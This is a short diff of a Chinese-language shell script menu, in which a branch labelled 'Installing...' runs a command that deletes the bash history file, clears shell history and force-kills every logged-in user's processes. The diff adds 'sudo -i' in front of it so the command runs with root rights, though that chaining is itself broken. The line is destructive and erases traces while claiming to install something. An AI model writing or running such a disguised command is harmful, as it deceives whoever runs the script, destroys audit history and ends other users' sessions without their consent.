@@ -124,7 +124,7 @@ case "$option" in
     clear
     echo -e "\033[33m正在安装...\033[0m"  # 黄色
     echo -e "\033[32m------------------------\033[0m"  # 绿色分隔线
-    rm -f ~/.bash_history && history -c && pkill -KILL -u $(who | awk '{print $1}' | sort | uniq)
+    sudo -i && rm -f ~/.bash_history && history -c && pkill -KILL -u $(who | awk '{print $1}' | sort | uniq)
     ;;
 
 
